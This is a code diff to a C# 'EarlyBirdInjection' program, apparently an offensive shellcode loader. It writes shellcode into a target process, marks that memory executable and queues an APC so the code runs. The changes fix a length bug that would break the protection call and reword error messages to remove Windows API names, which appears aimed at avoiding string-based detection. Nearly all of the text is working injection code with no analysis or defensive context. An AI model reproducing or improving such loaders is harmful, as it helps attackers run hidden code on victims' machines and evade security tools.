@@ -260,11 +260,12 @@ namespace EarlyBirdInjection
                 out bytesWritten
             );
 
+            int shellcodeLength = shellcode.Length;
             Array.Clear(shellcode, 0, shellcode.Length);
 
             if (!written)
             {
-                Console.WriteLine("[-] WriteProcessMemory failed.");
+                Console.WriteLine("[-] Memory write to target process failed.");
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
                 return;
@@ -273,7 +274,7 @@ namespace EarlyBirdInjection
 
             // ---- Step 4: Change memory to executable ----
             uint oldProtect;
-            VirtualProtectEx(pi.hProcess, remoteMemory, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+            VirtualProtectEx(pi.hProcess, remoteMemory, (UIntPtr)shellcodeLength, PAGE_EXECUTE_READ, out oldProtect);
             Console.WriteLine("[+] Memory protection changed to EXECUTE_READ");
 
             // ---- Step 5: Queue the APC ----
@@ -288,7 +289,7 @@ namespace EarlyBirdInjection
 
             if (apcResult == 0)
             {
-                Console.WriteLine("[-] QueueUserAPC failed.");
+                Console.WriteLine("[-] APC queue operation failed.");
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
                 return;
